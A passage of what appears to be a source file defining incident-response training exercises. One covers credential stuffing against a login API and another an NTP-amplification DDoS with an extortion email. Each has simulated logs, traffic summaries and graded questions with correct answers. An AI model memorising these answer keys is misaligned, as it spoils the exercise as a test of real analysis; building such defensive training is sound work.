Common factor: none of the affected accounts had MFA enabled.`,
      },
      {
        type: "PCAP_SUMMARY",
        title: "API access pattern",
        tactic: "LATERAL_MOVEMENT",
        content: `Endpoint                   Requests   Notes
POST /api/v1/login         1,482,004  no rate limit observed
GET  /api/v1/account       4,594      only after successful login
POST /api/v1/account/email 4,102      immediately after login

Destination for scraped data: ${C2.stuffing.domain} (${C2.stuffing.ip})`,
      },
    ],
    tasks: () => [
      {
        title: "Attack identification",
        prompt: "A 0.31% success rate across 1.2 million distinct usernames indicates what?",
        answerType: "RADIO",
        correctAnswer: "Credential stuffing using credentials breached elsewhere",
        options: [
          "Brute force against specific accounts",
          "Credential stuffing using credentials breached elsewhere",
          "Password spraying",
          "A breach of the internal credential store",
        ],
        points: 200,
      },
      {
        title: "Attacker objective",
        prompt: "What action did the attacker take immediately after most successful logins?",
        answerType: "FREE_TEXT",
        correctAnswer: "Changed email address",
        points: 200,
      },
      {
        title: "Control gap",
        prompt: "Which missing control most directly enabled the successful takeovers?",
        answerType: "RADIO",
        correctAnswer: "Multi-factor authentication on customer accounts",
        options: [
          "Web application firewall",
          "Multi-factor authentication on customer accounts",
          "Password complexity requirements",
          "Account lockout after failed attempts",
        ],
        points: 200,
      },
      {
        title: "Immediate mitigation",
        prompt: "Give the API endpoint most urgently requiring rate limiting.",
        answerType: "FREE_TEXT",
        correctAnswer: "/api/v1/login",
        points: 200,
      },
    ],
  },

  // ── DDoS extortion ───────────────────────────────────────────────────────
  {
    key: "ddos",
    name: "DDoS Extortion",
    difficulty: "EASY",
    minutes: 90,
    points: 700,
    briefing: () =>
      `Public services went down for 42 minutes this morning, and an extortion email arrived shortly afterwards demanding payment to prevent a larger attack. Establish the nature of the attack, whether anything was actually compromised, and what to advise.`,
    artifacts: () => [
      {
        type: "EVENT_LOG",
        title: "Edge logs — the week before",
        tactic: null,
        content: `Six days before the outage, repeated probing from a small set of hosts:

2026-07-26  HTTP HEAD / from ${C2.ddos.ip}          x 40 over 10 minutes
2026-07-26  DNS ANY queries for the apex domain     x 220
2026-07-27  TCP connect scan, ports 80/443/8080     from 3 hosts in the same /24
2026-07-28  Repeated requests to /health and /status x 1,100

None of this triggered an alert: each source stayed under the per-IP threshold.`,
      },
      {
        type: "PCAP_SUMMARY",
        title: "Traffic profile during the outage",
        tactic: "IMPACT",
        content: `Peak inbound      : 412 Gbps
Protocol          : UDP/123 (NTP) 78%, UDP/53 (DNS) 19%, other 3%
Distinct sources  : 24,180
Amplification     : average response/request ratio 206:1
Duration          : 42 minutes
Normal baseline   : 1.2 Gbps`,
      },
      {
        type: "EMAIL",
        title: "Extortion demand",
        tactic: "IMPACT",
        content: `From: contact@${C2.ddos.domain}
Subject: Your network

You experienced 42 minutes of downtime this morning. That was a demonstration.
Pay 12 BTC within 48 hours or the next attack will last a week.

Received: from ${C2.ddos.ip}`,
      },
      {
        type: "EVENT_LOG",
        title: "Service impact",
        content: `09:02  Public site unreachable
09:04  Upstream provider notified
09:18  Scrubbing engaged by provider
09:44  Traffic normalised, services restored

Internal systems: unaffected throughout. No evidence of intrusion.`,
      },
    ],
    tasks: () => [
      {
        title: "Attack type",
        prompt: "A 206:1 response ratio over UDP/123 indicates which technique?",
        answerType: "RADIO",
        correctAnswer: "NTP amplification / reflection",
        options: [
          "SYN flood",
          "NTP amplification / reflection",
          "Slowloris",
          "Application-layer HTTP flood",
        ],
        points: 200,
      },
      {
        title: "Scale",
        prompt: "Give the peak inbound traffic figure observed.",
        answerType: "FREE_TEXT",
        correctAnswer: "412 Gbps",
        points: 150,
      },
      {
        title: "Was there an intrusion?",
        prompt: "Does the evidence support a compromise of internal systems?",
        answerType: "RADIO",
        correctAnswer: "No — availability was affected but there is no evidence of intrusion",
        options: [
          "Yes — the attacker had internal access",
          "No — availability was affected but there is no evidence of intrusion",
          "Cannot be determined",
          "Yes — data was exfiltrated during the outage",
        ],
        points: 200,
      },
      {
        title: "Response",
        prompt: "What is the correct recommendation on the extortion demand?",
        answerType: "RADIO",
        correctAnswer:
          "Do not pay; engage the upstream provider, preserve evidence and report to law enforcement",
        options: [
          "Pay to avoid the larger attack",
          "Do not pay; engage the upstream provider, preserve evidence and report to law enforcement",
          "Negotiate for a lower amount",
          "Ignore it entirely and take no action",
        ],
        points: 150,
      },
    ],
  },
];
